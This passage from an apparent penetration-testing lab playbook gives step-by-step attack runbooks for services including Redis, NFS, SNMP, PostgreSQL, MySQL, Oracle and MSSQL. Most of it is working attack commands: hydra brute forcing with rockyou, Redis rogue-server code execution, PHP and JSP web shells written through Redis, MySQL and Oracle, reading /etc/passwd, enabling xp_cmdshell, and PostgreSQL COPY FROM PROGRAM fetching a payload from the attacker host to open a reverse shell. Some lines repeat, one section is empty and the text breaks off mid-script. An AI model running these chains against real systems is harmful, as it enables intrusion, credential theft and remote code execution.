hydra -l test -p test '<TARGET_IP>' http-post-form '<PATH>:<USER_FIELD>=^USER^&<PASS_FIELD>=^PASS^:F=<FAILURE_TEXT>' -vV
```

Then guess one known or suspected username:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt '<TARGET_IP>' http-post-form '<PATH>:<USER_FIELD>=^USER^&<PASS_FIELD>=^PASS^:F=<FAILURE_TEXT>' -vV
```

Supply `-s <PORT>` for a non-standard port and `-S` for HTTPS. Add `-t 16` only after the single-threaded attempt reports correctly; lower it again on 429 or timeouts. Add `-f` to stop at the first pair.

| Result | Next |
| --- | --- |
| `login:` and `password:` lines | **WEB-09** with that account. |
| Every attempt reported as failure | The failure string is wrong; recapture the rejection at **WEB-08**. |
| 429 or timeouts | Retry once with a lower `-t`; then **PAUSE-COVERAGE**. |
| List exhausted, form correct | **PAUSE-COVERAGE**; record the list and failure string. |
| CSRF token or JavaScript-built body | Use Burp Intruder instead; **WEB-08**. |

# redis

## REDIS-01. Does this Redis endpoint permit the intended connection?

```bash
redis-cli -h '<TARGET_IP>' -p <PORT> PING
```

With a supplied password, use `--askpass`; add `--user '<USERNAME>'` for an ACL user.

| Result | Next |
| --- | --- |
| `PONG` | **REDIS-02**. |
| `NOAUTH` with a permitted password | Retry with `--askpass`. |
| `NOAUTH` without a credential, or auth fails | **NET-05**. |
| `NOPERM` or protected-mode denial | **NET-05**. |
| Connection error | **NET-05** or **PAUSE-COVERAGE**. |

## REDIS-02. What runtime context can this access read?

```bash
redis-cli -h '<TARGET_IP>' -p <PORT>
```

At the prompt:

```text
INFO server
CONFIG GET dir
CONFIG GET dbfilename
QUIT
```

| Result | Next |
| --- | --- |
| Version and a matching execution candidate | **REDIS-03**. |
| Context only, no candidate | **NET-05**. |
| `NOPERM` or partial | **PAUSE-COVERAGE**. |

## REDIS-03. Does the reviewed Redis candidate match this live instance?

Enter after EXP-01 named a module- or replication-based candidate.

```text
COMMAND INFO MODULE
COMMAND INFO REPLICAOF
MODULE LIST
INFO replication
```

| Result | Next |
| --- | --- |
| Commands present, disposable lab with reset | **REXP-01**, or **EXP-02** for other candidates. |
| Required command absent or denied | **NET-05**. |
| State already differs from baseline | **PAUSE-RECOVERY**. |

## REDIS-04. Did the reviewed Redis attempt produce attributable OS execution?

Only after the attempt reports `system.exec` was added.

```text
COMMAND INFO system.exec
system.exec "id"
system.exec "hostname"
```

| Result | Next |
| --- | --- |
| Attributable output from the assigned host | **SHELL-01** if a socket shell exists, then **EXP-03** / **LNX-01**. |
| Command missing or host conflict | **EXP-02**. |
| State changed, proof uncertain | **PAUSE-RECOVERY**. |

## REXP-01. Do the rogue-replication prerequisites hold?

Enter from REDIS-03 with the reviewed tool and `exp.so` hash recorded.

```text
INFO replication
MODULE LIST
CONFIG GET dir
CONFIG GET dbfilename
```

Proceed only when the version matches, the role is `master`, module/replication/CONFIG are permitted, no `system` module exists, and the target can reach Kali.

| Result | Next |
| --- | --- |
| All prerequisites observed and baseline recorded | **REXP-02**. |
| Existing replica, missing reset or unexplained module state | **PAUSE-RECOVERY**. |
| Command absent or version mismatch | **NET-05**. |

## REXP-02. Can one reviewed rogue-server attempt establish Redis OS execution?

```bash
python3 ./redis-rogue-server.py --help
python3 ./redis-rogue-server.py --rhost '<TARGET_IP>' --rport '<PORT>' --lhost '<KALI_IP>' --lport '<ROGUE_PORT>'
```

Add `--passwd '<PASSWORD>'` only when the verified Redis password is required. At the `[<<]` prompt:

```text
id
hostname
pwd
```

| Result | Next |
| --- | --- |
| Attributable output on the assigned host | **REXP-03**. |
| Module load, no identity output | **REXP-03**; status text is not proof. |
| Module loaded, identity missing | **REDIS-04**. |
| Verified PHP include and writable web dir | **REXP-04**. |
| Replication or module error | **REXP-03** for the actual state. |

## REXP-03. What state did the rogue-server attempt leave behind?

From a second client:

```text
COMMAND INFO system.exec
MODULE LIST
INFO replication
CONFIG GET dbfilename
```

Restore the baseline while `system.exec` exists:

```text
system.exec "rm -- '<ORIGINAL_DIR>/exp.so'"
CONFIG SET dbfilename '<ORIGINAL_DBFILENAME>'
MODULE UNLOAD system
REPLICAOF NO ONE
```

Then repeat the checks. Any mismatch goes to **PAUSE-RECOVERY** or lab reset.

## REXP-04. Can a Redis-written RDB execute through PHP?

Use only while `system.exec` works and WREAD-01 proved an actual PHP `include`.

```text
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET rdbcompression
SET owb_php_<ID> '<?php echo "OWB_USER:"; system($_GET["owb_cmd"]); ?>'
CONFIG SET dir '<WEB_WRITABLE_DIR>'
CONFIG SET dbfilename 'owb-user-<ID>.rdb'
CONFIG SET rdbcompression no
SAVE
```

```bash
curl -sS --get 'http://<TARGET_IP>/<LFI_ENDPOINT>' --data-urlencode '<FILE_PARAM>=<WEB_WRITABLE_DIR>/owb-user-<ID>.rdb' --data-urlencode 'owb_cmd=id'
```

| Result | Next |
| --- | --- |
| `OWB_USER:` plus web identity | **[SHELL-01](./shell-01)/[EXP-03](./exp-03)** if a shell is needed, then **LNX-01**. |
| RDB bytes, no output | Restore, return to **WREAD-01**. |
| `SAVE` fails | Restore, then **LNX-04** from a shell. |

Restore `dir`, `dbfilename` and `rdbcompression`, `DEL owb_php_<ID>`, and remove the `.rdb` through `system.exec`, then return to **REXP-03**.

# dns

Replace every `<...>` value before running its command.

## DNS-01 — Can the assigned resolver answer the observed name?

Enter with the observed DNS port and an in-scope name.

```bash
dig '@<DNS_IP>' -p '<DNS_PORT>' -q '<HOSTNAME>' -t A +timeout=3 +tries=1
```

Retry with `+tcp` once if the reply is truncated. `NXDOMAIN` is an answer; `REFUSED`/`SERVFAIL` is not. A reverse lookup can suggest a name, not prove one:

```bash
dig '@<DNS_IP>' -p '<DNS_PORT>' -x '<TARGET_IP>' +timeout=3 +tries=1
```

| Result | Next |
| --- | --- |
| A record returned | **DNS-02** with that name. |
| CNAME only | Query the canonical name if in scope; otherwise **NET-05**. |
| NXDOMAIN | **NET-05**. |
| SOA or NS suggests an assigned zone | **DNS-03**. |
| REFUSED, SERVFAIL or timeout | **NET-03**, or **PAUSE-ROUTE** for a route problem. |

## DNS-02 — Does this name belong to the service you intend to inspect?

```bash
curl -q --noproxy '*' --connect-timeout 5 --resolve '<HOSTNAME>:<PORT>:<TARGET_IP>' -i '<SCHEME>://<HOSTNAME>:<PORT>/'
```

Keep certificate validation. Add `--cacert '<LAB_CA>'` only when a lab CA was supplied.

| Result | Next |
| --- | --- |
| Attributable HTTP response | **WEB-01** at this origin. |
| Redirect to another in-scope name | **DNS-01** for that name. |
| Certificate failure | **PAUSE-ROUTE**. |
| Connection failure | **NET-03**. |
| Domain service context | **AD-01**. |

## DNS-03 — Is one assigned zone authoritative and explicitly transferable?

```bash
dig '@<DNS_IP>' -p '<DNS_PORT>' -q '<ZONE>.' SOA +noall +answer +authority
timeout 20s dig '@<DNS_IP>' -p '<DNS_PORT>' -q '<ZONE>.' AXFR +noall +answer
```

Only run AXFR when the zone transfer is authorized.

| Result | Next |
| --- | --- |
| SOA confirms the zone | **DNS-02** or **NET-05**. |
| AXFR returns records | Pick one name through **DNS-01**. |
| Refused or timed out | **NET-05**. |
| Partial transfer | **PAUSE-COVERAGE**. |

# nfs

Replace every `<...>` value before running its command.

## NFS-01 — What export and client context are actually available?

```bash
timeout 15s showmount -e '<TARGET_IP>'
```

Use `rpcinfo -p '<TARGET_IP>'` only if the listing fails and you still need the version or port.

| Result | Next |
| --- | --- |
| Export listed and your client permitted | **NFS-02**. |
| Client excluded | **NET-05**. |
| NFSv4 with a supplied path | **NFS-02** with that version. |
| No export list | **GAP-SERVICE**. |
| RPC error | **NET-03**. |

## NFS-02 — Can your permitted identity read one relevant file?

```bash
mkdir -m 700 -- '/tmp/owb-nfs'
sudo mount -t nfs -o 'ro,nosuid,nodev,noexec,vers=<VERSION>,proto=tcp,port=<PORT>' '<TARGET_IP>:<EXPORT>' '/tmp/owb-nfs'
findmnt --mountpoint '/tmp/owb-nfs' -o SOURCE,OPTIONS
ls -lan -- '/tmp/owb-nfs'
stat -- '/tmp/owb-nfs/<FILE>'
head -c 4096 -- '/tmp/owb-nfs/<FILE>'
```

Cleanup after the read:

```bash
sudo umount -- '/tmp/owb-nfs' && rmdir -- '/tmp/owb-nfs'
```

| Result | Next |
| --- | --- |
| File readable | **NET-05** for its matching service. |
| Mount denied | **NET-05**. |
| Permission denied | **NET-05**; keep your `id`. |
| Export writable and write test permitted | **NFS-03**. |
| Stalled or unmount failed | **PAUSE-RECOVERY**. |

## NFS-03. Can this identity write and remove an inert file?

Enter only when a write test is permitted.

```bash
mkdir -m 700 -- '/tmp/owb-nfs-w'
sudo mount -t nfs -o 'rw,nosuid,nodev,noexec,vers=<VERSION>,proto=tcp,port=<PORT>' '<TARGET_IP>:<EXPORT>' '/tmp/owb-nfs-w'
( set -C; printf 'probe\n' > '/tmp/owb-nfs-w/probe-<ID>.txt' )
cat -- '/tmp/owb-nfs-w/probe-<ID>.txt'
rm -i -- '/tmp/owb-nfs-w/probe-<ID>.txt'
sudo umount -- '/tmp/owb-nfs-w' && rmdir -- '/tmp/owb-nfs-w'
```

| Result | Next |
| --- | --- |
| Created, read back and removed | **NET-05**. |
| Write denied | **NET-05**. |
| Probe remains | **PAUSE-RECOVERY**. |
| Owner differs from your `id` | **GAP-ACCESS**. |

# snmp


Run this in Kali against one authorized target. Community strings go straight on
the command line; that is normal on a lab box. A `199/tcp smux` listener is the
usual clue that an agent exists, and 161 is UDP, so only a UDP scan sees the
agent's own port. Reads only, no `snmpset`.

## SNMP-01. Does 161 answer, and which community works?

Scan the one port:

```bash
sudo nmap -sU -p 161 -sV <TARGET_IP>
```

Test the two common communities against one scalar:

```bash
snmpget -v1 -c public -t 3 -r 0 -On <TARGET_IP> 1.3.6.1.2.1.1.1.0
snmpget -v1 -c private -t 3 -r 0 -On <TARGET_IP> 1.3.6.1.2.1.1.1.0
```

Or let a list try them:

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET_IP>
```

If a v3 user was supplied, use it instead:

```bash
snmpget -v3 -l authPriv -u <USERNAME> -a SHA -A '<AUTH_PASS>' -x AES -X '<PRIV_PASS>' <TARGET_IP> 1.3.6.1.2.1.1.1.0
```

| Result | Next action |
| --- | --- |
| Scalar returned | Record the community, version and `sysDescr`; **SNMP-02**. |
| Every attempt times out | Retry each once. Still silent is unresolved, not closed; **NET-04**, then stop chasing 161. |
| `open\|filtered` | Treat it as a timeout: one retry, then **NET-04**. |
| One community rejected, another returns data | Use the working one. A rejection does not make the service dead. |
| Only 199/tcp was seen and 161 stays silent | Keep 199 as a lead only; **NET-05** for another service. |
| SNMPv3 authentication fails | Recheck the supplied user, algorithm and passphrase once; otherwise **NET-05**. |

## SNMP-02. What do the returned rows give you?

Dump the tree once and work from the file:

```bash
snmpwalk -v1 -c <COMMUNITY> -On <TARGET_IP> > snmp.txt
wc -l snmp.txt
```

For a v3 context, use the same `-v3 -l authPriv -u ...` flags from SNMP-01 in place of `-v1 -c`.

Grep for the parts that lead somewhere:

```bash
grep -E '1\.3\.6\.1\.2\.1\.1\.(1|5)\.' snmp.txt            # sysDescr, sysName
grep -E '1\.3\.6\.1\.2\.1\.25\.4\.2\.1\.(4|5)\.' snmp.txt  # process path and arguments
grep '1\.3\.6\.1\.2\.1\.25\.6\.3\.1\.2\.' snmp.txt          # installed software
grep -Ei 'user|home|/opt|/srv|config|pass|key' snmp.txt
```

| Result | Next action |
| --- | --- |
| Process arguments show a config path, socket, port or account | Open the service task it belongs to (**MAIL-01** for SMTP, otherwise **NET-05**) and verify the value in the file or service, not from the SNMP copy. |
| Package name and version match an observed service | **EXP-01** with the exact version; a version match alone proves nothing. |
| A username or home path appears | Try it for the matching service; SSH goes to **SSH-01**. |
| A route or second interface appears | Record it; **GAP-ACCESS** until you can reach it. |
| Walk partial, or only MIB-II answered | Keep the rows you have; **PAUSE-COVERAGE** for the missing subtrees. A `sysDescr`-only agent is common and not a dead end. |
| Nothing useful | **NET-05**. Do not keep walking the same tree. |

Delete the dump when done if you no longer need it:

```bash
rm -i snmp.txt
```

# database


`odat` comes from GitHub and `lib_mysqludf_sys` from its source tree.

`odat` comes from GitHub and `lib_mysqludf_sys` from its source tree.

Confirm the engine from its response before picking a client. One supplied identity per endpoint.

## DB-01. Can the assigned identity establish a database session?

PostgreSQL from Kali, using the port reported by the scan:

```bash
psql -h '<TARGET_IP>' -p '<PORT>' -U '<USERNAME>' -d postgres
```

MySQL or MariaDB in an explicitly non-TLS lab:

```bash
mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='<TARGET_IP>' --port='<PORT>' --user='<USERNAME>' --password --disable-ssl
```

`psql` prompts when the server requests a password and negotiates TLS when it is
offered. For verified TLS use `PGSSLMODE=verify-full
PGSSLROOTCERT='<CA>'` with the certificate hostname. For MariaDB use `--ssl
--ssl-ca='<CA>' --ssl-verify-server-cert`. Do not fall back to plaintext after a
trust failure.

From a shell on the target, when the account is bound to loopback:

```bash
mariadb --no-defaults --protocol=tcp --connect-timeout=5 --host='127.0.0.1' --port='<PORT>' --user='<USERNAME>' --password
```

`--password` prompts, so the value stays out of `ps`. `-p'<PASSWORD>'` is the same login with the value in argv.

| Result | Next |
| --- | --- |
| PostgreSQL `psql` prompt | **DB-19**. |
| MySQL or MariaDB prompt | **DB-15**. |
| Engine is MSSQL with an ODBC client | **DB-03**. |
| Oracle listener identified | **DB-21**. |
| Password or account denied | **NET-05**. |
| Certificate or hostname failure | **PAUSE-ROUTE**. |
| Refused, timeout or DNS failure | **NET-03** or **PAUSE-ROUTE**. |

## DB-02. What can this role inspect that changes the next question?

PostgreSQL:

```sql
SELECT current_user, session_user, current_database(), inet_server_addr(), inet_server_port();
SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA>' LIMIT 30;
```

MariaDB:

```sql
SELECT USER(), CURRENT_USER(), DATABASE(), @@hostname, VERSION();
SHOW DATABASES;
SHOW COLUMNS FROM `table` FROM `database`;
```

Check `SHOW GRANTS` or `Ssl_cipher` only when the next decision needs them.

| Result | Next |
| --- | --- |
| Relevant schema or rights | **NET-05** for the matching application. |
| IMPERSONATE or linked-server right | **DB-09** / **DB-10**. |
| `xp_dirtree` enabled | **DB-11**. |
| MySQL or MariaDB prompt | **DB-15**. |
| `FILE` with an empty or wide `secure_file_priv` | **DB-16** / **DB-17**. |
| `FILE` and a writable plugin directory | **DB-12**. |
| Oracle session with `UTL_FILE` or Java | **DB-22** / **DB-13**. |
| PostgreSQL program or server-file right | **DB-07** / **DB-08**. |
| Permission denied | **NET-05**. |
| Server identity differs | **PAUSE-ROUTE**. |

The question set follows the [source checklist](../references/checklist.md).

# oracle

Supplied-account Oracle, or local OS access as the Oracle owner. Start at DB-21;
DB-01 proves the listener first. Directory objects bound every file path, and
`UTL_FILE` never accepts an arbitrary path.

## DB-21. Can the observed Oracle identity authenticate?

Enter with a verified listener, one in-scope service and a supplied account, or a
local shell as the Oracle owner.

Question: Which login path accepts this identity?

Local OS authentication, from the Oracle owner's shell:

```bash
sqlplus -S '/ as sysdba'
```

Supplied account over loopback; the password is prompted:

```bash
sqlplus -S '<USERNAME>@//127.0.0.1:<PORT>/<SERVICE>'
```

With only the Python client, DB-06 performs the same connect. `lsnrctl status`
names registered services when one service is rejected.

| Result | Next |
| --- | --- |
| SQL prompt | **DB-06**. |
| ORA-01017 | **DB-01** with the supplied identity, else **GAP-ACCESS**. |
| ORA-12514 or unknown service | Recheck the service from `lsnrctl status`; **DB-21**. |
| Timeout or TNS failure | **NET-03** / **PAUSE-ROUTE**. |

## DB-06. What does this Oracle identity expose?

Enter from DB-21. Run the statements separately; the directory objects and
session privileges decide the file steps.

```sql
SELECT SYS_CONTEXT('USERENV','SESSION_USER'), SYS_CONTEXT('USERENV','DB_NAME') FROM dual;
SELECT privilege FROM session_privs ORDER BY privilege;
SELECT directory_name, directory_path FROM all_directories;
SELECT owner, object_type, object_name FROM user_objects FETCH FIRST 30 ROWS ONLY;
```

| Result | Next |
| --- | --- |
| `UTL_FILE` and a mapped directory object | **DB-22** / **DB-23**. |
| `CREATE PROCEDURE` and Java installed | **DB-13**. |
| Only metadata | **NET-05** for the matching application. |
| ORA-00942 on a view | Recheck the grant; **PAUSE-COVERAGE**. |

## DB-22. Can this identity read one file through a directory object?

Enter from DB-06 with `UTL_FILE` executable and a directory object that maps to
a useful path. `get_line` returns one line per call.

```sql
SET SERVEROUTPUT ON
DECLARE f utl_file.file_type; b varchar2(32767);
BEGIN
  f := utl_file.fopen('<DIRECTORY_OBJECT>', '<FILE>', 'R');
  utl_file.get_line(f, b);
  dbms_output.put_line(b);
  utl_file.fclose(f);
END;
/
```

| Result | Next |
| --- | --- |
| Line returned | Read the config for credentials; a hash goes to **PASS-02**. |
| ORA-29280 invalid path | **DB-06** for a directory object that exists. |
| ORA-06550 no grant | **DB-13** if Java is available. |

## DB-23. Can this identity write one file?

Enter from DB-06 with `UTL_FILE` executable and a directory object that maps to
a served path. `W` truncates, so choose a new leaf.

```sql
DECLARE f utl_file.file_type;
BEGIN
  f := utl_file.fopen('<DIRECTORY_OBJECT>', 'owb-<ID>.jsp', 'W');
  utl_file.put_line(f, '<%= "OWB-<ID>" %>');
  utl_file.fclose(f);
END;
/
```

| Result | Next |
| --- | --- |
| File written | Request it from the web service, or **DB-13**. |
| ORA-29280 wrong object | **DB-06**. |
| ORA-06550 no grant | **DB-13**. |

# postgresql

Start at DB-18 from Kali with the host and port reported by the scan. Use the
`postgres` database when no application database is known. After login, DB-19
records the role and DB-07 tests whether it can run a server-side program.

## DB-18. Can the observed PostgreSQL identity authenticate?

Enter with one observed PostgreSQL endpoint and one authorized role. When an
authorized lab explicitly asks for default credentials, try the documented pair
once. Do not spray password guesses.

From Kali, connect to the reported TCP port. This is the normal first command:

```bash
psql -h '<TARGET_IP>' -p '<PORT>' -U postgres -d postgres
```

`-h` is the target, `-p` is the scan port, `-U` is the PostgreSQL role and `-d`
is the initial database. Keep a nonstandard port such as `5437`. `psql` prompts
for the password and negotiates TLS when the server offers it.

Only from a shell on the target, try peer authentication over its Unix socket:

```bash
psql -X -w -d postgres
```

Only from a shell on the target, use a supplied role over loopback:

```bash
psql -X -W -h '127.0.0.1' -p '<PORT>' -U '<USERNAME>' -d postgres
```

`-X` ignores the target account's `psql` startup file. `-W` prompts for a
password and `-w` never prompts. A path such as `/var/run/postgresql` names a
target-local Unix socket directory, not a remote host. Do not disable TLS merely
to simplify the command.

| Result | Next |
| --- | --- |
| `psql` prompt | **DB-19**. |
| Password authentication failed | Recheck the one authorized role and password; otherwise **GAP-ACCESS**. |
| No `pg_hba.conf` entry | This client address or TLS mode is not allowed; keep the denial and use **GAP-ACCESS**. |
| Certificate or hostname failure | Use the assigned CA and certificate hostname; do not fall back to plaintext. |
| Refused or timeout | **NET-03**. |

## DB-19. What does this PostgreSQL role expose?

These commands run at a `psql` prompt such as `postgres=#`, not in Bash. Clear
unfinished input first:

```text
\r
```

`postgres=#` is ready for a new command. `postgres-#` means the query buffer is
unfinished; `\r` clears it. `SHOW DATABASES` is MySQL or MariaDB syntax.
PostgreSQL uses `\l` to list databases, while SQL `SHOW` reads server settings.

List the current connection, databases and roles. Backslash commands do not end
with a semicolon:

```text
\conninfo
\l+
\du+
```

Connect to each non-template database, then list its schemas and relations:

```text
\c <DATABASE>
\dn+
\dt *.*
\dv *.*
```

`\dt` without a pattern only searches the current database and visible schemas.
`template0` rejects normal connections by design, and `template1` is a creation
template rather than an application database.

Describe one interesting table, then read a small sample:

```text
\d <SCHEMA>.<TABLE>
```

```sql
SELECT * FROM <SCHEMA>.<TABLE> LIMIT 20;
```

Send each privilege and setting query separately. SQL statements end with a
semicolon:

```sql
SELECT current_user, session_user, version(), current_database(), inet_server_addr(), inet_server_port();
SELECT rolname, rolsuper, rolcreaterole, rolcreatedb, rolcanlogin FROM pg_roles ORDER BY rolname;
SELECT rolsuper, pg_has_role(current_user,'pg_read_server_files','USAGE'), pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
SELECT datname FROM pg_database WHERE datallowconn ORDER BY datname;
SELECT schemaname, tablename FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema') LIMIT 40;
SHOW data_directory;
SHOW config_file;
```

| Result | Next |
| --- | --- |
| `pg_read_server_files` or superuser | **DB-08**. |
| `pg_execute_server_program` or superuser | **DB-07**. |
| Superuser and writable data directory | **DB-20**. |
| Application table with hashes | **PASS-02** offline. |
| No server-file right | **GAP-SERVICE**. |

## DB-07. Can this PostgreSQL role run a server-side command?

Enter from DB-19 with `pg_execute_server_program` or superuser. Prove the server
process identity before staging any file:

```sql
SELECT rolsuper, pg_has_role(current_user,'pg_execute_server_program','USAGE') FROM pg_roles WHERE rolname=current_user;
BEGIN;
CREATE TEMP TABLE "proof_<ID>" (line text) ON COMMIT DROP;
COPY pg_temp."proof_<ID>" FROM PROGRAM '/usr/bin/id';
SELECT line FROM pg_temp."proof_<ID>";
ROLLBACK;
```

If a shell is needed, check the server architecture and available download
clients first:

```sql
CREATE TEMP TABLE "stage_<ID>" (line text);
COPY pg_temp."stage_<ID>" FROM PROGRAM 'uname -m; command -v wget; command -v curl; command -v python3';
SELECT line FROM pg_temp."stage_<ID>";
```

Generate a matching Linux payload at **PAY-02**. On Kali, record its hash, serve
its directory and start the listener in a second terminal:

```bash
sha256sum payload.elf
python3 -m http.server '<HTTP_PORT>' --bind '<KALI_IP>'
```

```bash
nc -lvnp '<LPORT>'
```

Back at the `psql` prompt, use only the downloader found above. These commands
run as the PostgreSQL service account on the target:

```sql
TRUNCATE pg_temp."stage_<ID>";
COPY pg_temp."stage_<ID>" FROM PROGRAM '/usr/bin/wget -q http://<KALI_IP>:<HTTP_PORT>/payload.elf -O /tmp/owb-<ID>.elf';
```

Or, when `curl` is the available client:

```sql
TRUNCATE pg_temp."stage_<ID>";
COPY pg_temp."stage_<ID>" FROM PROGRAM '/usr/bin/curl -fsSL http://<KALI_IP>:<HTTP_PORT>/payload.elf -o /tmp/owb-<ID>.elf';
```

Verify the target copy, make it executable and run it:

```sql
TRUNCATE pg_temp."stage_<ID>";
COPY pg_temp."stage_<ID>" FROM PROGRAM '/usr/bin/sha256sum /tmp/owb-<ID>.elf';
SELECT line FROM pg_temp."stage_<ID>";
COPY pg_temp."stage_<ID>" FROM PROGRAM '/bin/chmod 700 /tmp/owb-<ID>.elf';
TRUNCATE pg_temp."stage_<ID>";
COPY pg_temp."stage_<ID>" FROM PROGRAM '/tmp/owb-<ID>.elf';
```

The last `COPY` may stay busy while the callback is open. Verify the new session
at **EXP-03**, then enter the Linux lane at **LPRIV-01**. After closing the
payload, remove only the staged file:

```sql
COPY pg_temp."stage_<ID>" FROM PROGRAM '/bin/rm -f /tmp/owb-<ID>.elf';
DROP TABLE pg_temp."stage_<ID>";
```

| Result | Next |
| --- | --- |
| uid/gid output | Build a matching payload at **PAY-02**, then return here. |
| Callback with the expected host and identity | **EXP-03**, then **LPRIV-01**. |
| `Permission denied` on `PROGRAM` | **DB-19** for the exact role. |
| Downloader missing or transfer fails | Keep the error; **PAUSE-COVERAGE**. |
| `Permission denied` when executing the file | Check the path's mount at **LPRIV-10**. |
| No callback | **EXP-02** with the raw listener and PostgreSQL output. |

## DB-08. Can the PostgreSQL account read one relevant server file?

Enter from DB-19 with `pg_read_server_files` or superuser.

```sql
SELECT pg_catalog.pg_read_binary_file('<FILE>', 0, 4096, true)::text;
```

Or decode the hex locally: `printf '%s' '<HEX>' | xxd -r -p | head -c 4096 | cat -v`.

| Result | Next |
| --- | --- |
| Relevant content | Read the config for credentials; a hash goes to **PASS-02**. |
| Missing file | **PAUSE-COVERAGE**. |
| Permission denied | **DB-19**. |

## DB-20. Can this role write one file?

Enter as superuser, or with a role that owns the target directory. `COPY TO`
overwrites an existing file and resolves a relative path against the data
directory.

```sql
SHOW data_directory;
COPY (SELECT '<MARKER>') TO '/tmp/owb-<ID>.txt';
SELECT pg_catalog.pg_read_file('/tmp/owb-<ID>.txt');
```

A web shell only into a served directory:

```sql
COPY (SELECT '<?php echo "<ID>"; ?>') TO '<ABSOLUTE_WEBROOT>/owb-<ID>.php';
```

Clean up with `COPY (SELECT 1) TO PROGRAM 'rm -f <PATH>'` when DB-07 works,
otherwise from a shell.

| Result | Next |
| --- | --- |
| Marker written | **DB-07** if an execute right exists, else the web branch. |
| Existing file | Choose a new leaf; `COPY` overwrites without asking. |
| Permission denied | **DB-19** for rights and directory. |

# mysql

Target-local or supplied-account MySQL/MariaDB. From a shell start at DB-14; from
Kali, DB-01 proves the endpoint first. Confirm the engine and the exact identity
before each step, and keep the client `--no-defaults` first so a local `my.cnf`
cannot redirect the connection.

## DB-14. Can the observed MySQL identity authenticate over socket or loopback?

Enter when DB-01 reached a MySQL/MariaDB prompt, or a supplied account and one
observed endpoint are both in scope.

Question: Which local path does this account accept?

Socket first, when `ss -lx` or `/var/run/mysqld` shows one:

```bash
mysql --no-defaults --protocol=socket --socket='<ABSOLUTE_SOCKET>' --user='<USERNAME>' --password --connect-timeout=5
```

If the account is TCP-only:

```bash
mysql --no-defaults --protocol=tcp --host='127.0.0.1' --port='<PORT>' --user='<USERNAME>' --password --connect-timeout=5 --disable-ssl
```

`--password` prompts, so the value stays out of `ps`; `-p'<PASSWORD>'` is the
argv form. `127.0.0.1` only from a shell on the target. With the `mysql` client
use `--ssl-mode=DISABLED` in place of `--disable-ssl`. Do not replace a supplied
account with `root` guesses yet.

| Result | Next |
| --- | --- |
| Client prompt | **DB-15**. |
| Password or account denied | **DB-01** with the supplied identity, else **GAP-ACCESS**. |
| TLS required | Add `--ssl --ssl-ca='<CA>' --ssl-verify-server-cert`, or `--ssl-mode=REQUIRED` with the `mysql` client, and retry once. |
| Refused or timeout | **NET-03**. |

## DB-15. What does this MySQL identity read that changes the next step?

Send each statement separately. `FILE`, `secure_file_priv` and the plugin
directory decide the write and execution paths.

```sql
SELECT USER(), CURRENT_USER(), @@version, @@version_compile_os, @@hostname;
SELECT @@secure_file_priv, @@plugin_dir, @@datadir, @@socket;
SHOW GRANTS;
SHOW DATABASES;
SELECT table_schema, table_name FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys') LIMIT 40;
```

| Result | Next |
| --- | --- |
| `FILE` and an empty or wide `secure_file_priv` | **DB-16** for reads, **DB-17** for writes. |
| `FILE` and a plugin directory inside `secure_file_priv` | **DB-12**. |
| Application table with hashes | **PASS-02** offline. |
| Plaintext credential in a table | **DB-01** for the matching service, or its branch. |
| No `FILE` and no useful right | **GAP-SERVICE**. |

## DB-16. Can this identity read one relevant server file?

`secure_file_priv` permits only the path it names, and `LOAD_FILE` returns
`NULL` for a denial, a directory, or an oversized file.

```sql
SELECT @@secure_file_priv;
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('<ABSOLUTE_OBSERVED_CONFIG>');
```

| Result | Next |
| --- | --- |
| File content | Read the supplied config for credentials; a hash goes to **PASS-02**. |
| `NULL` | Check the `secure_file_priv` path at **DB-15**, then try **DB-17**. |
| `FILE` denied | **DB-15**. |

## DB-17. Can this identity write one file?

Write an inert marker first, then a web shell only when the webroot falls inside
`secure_file_priv`. `INTO OUTFILE` fails when the file already exists, and the
file is owned by the SQL server account.

```sql
SELECT '<MARKER>' INTO OUTFILE '/tmp/owb-<ID>.txt';
SELECT LOAD_FILE('/tmp/owb-<ID>.txt');
SELECT '<?php echo "<ID>"; ?>' INTO OUTFILE '<ABSOLUTE_WEBROOT>/owb-<ID>.php';
```

| Result | Next |
| --- | --- |
| Marker written | **DB-12** if a plugin directory is writable, else the upload or web branch for the webroot. |
| File exists | Choose a new `<ID>` leaf; never overwrite. |
| Path or privilege denied | **DB-15** for `secure_file_priv`, then **GAP-SERVICE**. |

Remove the marker and test file once their result is recorded.

## DB-12. Can MySQL load a UDF?

**Optional.** Safe to skip under exam time pressure.

**Optional.** Safe to skip under exam time pressure.

Enter from DB-15 or DB-17 with `FILE`, a plugin directory inside
`secure_file_priv`, and a reviewed `.so` for this exact architecture. The
resulting command runs as the SQL server account, not root.

```sql
SHOW VARIABLES LIKE 'plugin_dir';
SHOW VARIABLES LIKE 'secure_file_priv';

```

## DB-04. What can this SQL identity read or execute on this server?

## DB-05. Does the permitted xp_cmdshell path prove its actual OS identity?

Record both settings first, then enable only what this task changed:

```sql
EXEC sys.sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sys.sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC master.dbo.xp_cmdshell N'whoami';
```

Restore reverse order afterwards (`xp_cmdshell` 0, then advanced options 0) and recheck `value_in_use`.

# mail

## MAIL-01. What protocol and TLS context does this endpoint offer?

Implicit TLS:

```bash
timeout 20s openssl s_client -connect '<TARGET_IP>:<PORT>' -servername '<CERT_HOST>' -verify_hostname '<CERT_HOST>' -CAfile '<CA>' -verify_return_error -crlf -quiet
```

Add `-starttls smtp|imap|pop3` for STARTTLS. Then send `EHLO x`/`QUIT`, `a1 CAPABILITY`/`a2 LOGOUT`, or `CAPA`/`QUIT`.

| Result | Next |
| --- | --- |
| IMAP with mailbox account | **MAIL-02**. |
| POP3 with account | **MAIL-03**. |
| SMTP only | **NET-05**. |
| SMTP user or relay question | **SMTP-01**. |
| Certificate failure | **PAUSE-ROUTE**. |

## MAIL-02. Can this identity read one relevant message without changing flags?

```bash
python3 - <<'PY'
import getpass, imaplib, ssl, sys
sys.stdin = open('/dev/tty', 'r', encoding='utf-8')
host=input('Host: ').strip(); port=int(input('Port: ')); mode=input('implicit/starttls: ').strip()
